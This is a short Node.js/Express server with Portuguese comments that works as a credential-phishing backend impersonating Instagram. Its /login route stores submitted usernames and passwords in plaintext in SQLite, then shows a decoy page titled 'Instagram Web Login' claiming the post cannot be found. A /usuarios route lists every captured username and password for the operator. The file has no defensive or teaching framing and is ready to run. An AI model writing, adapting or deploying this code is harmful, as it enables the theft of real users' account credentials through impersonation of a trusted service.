const express = require("express");
const bodyParser = require("body-parser");
const sqlite3 = require("sqlite3").verbose();
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Conecta/Cria o banco SQLite
const db = new sqlite3.Database("./meubanco.db", (err) => {
  if (err) console.error("Erro ao abrir banco:", err.message);
  else console.log("Banco conectado!");
});

// Cria a tabela se não existir
db.run(`CREATE TABLE IF NOT EXISTS usuarios (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT,
  password TEXT
)`);

// Middlewares
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Rota para servir o index
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Recebe o login, salva e responde com a página branca pedida
app.post("/login", (req, res) => {
  const { username, password } = req.body;

  db.run(
    `INSERT INTO usuarios (username, password) VALUES (?, ?)`,
    [username, password],
    function (err) {
      if (err) console.error(err.message);

      res.send(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Instagram Web Login</title>
  <style>
    body { background:#fff; color:#000; font-family:Arial,sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
    h1 { font-size:20px; font-weight:normal; }
  </style>
</head>
<body>
  <h1>Não foi possível localizar a postagem</h1>
</body>
</html>`);
    }
  );
});

// Lista usuários (pra você conferir)
app.get("/usuarios", (req, res) => {
  db.all("SELECT * FROM usuarios", [], (err, rows) => {
    if (err) return res.send("Erro ao buscar usuários");
    let html = "<h2>Usuários cadastrados:</h2><ul>";
    rows.forEach(u => { html += `<li>ID: ${u.id} | Usuário: ${u.username} | Senha: ${u.password}</li>`; });
    html += "</ul>";
    res.send(html);
  });
});

app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
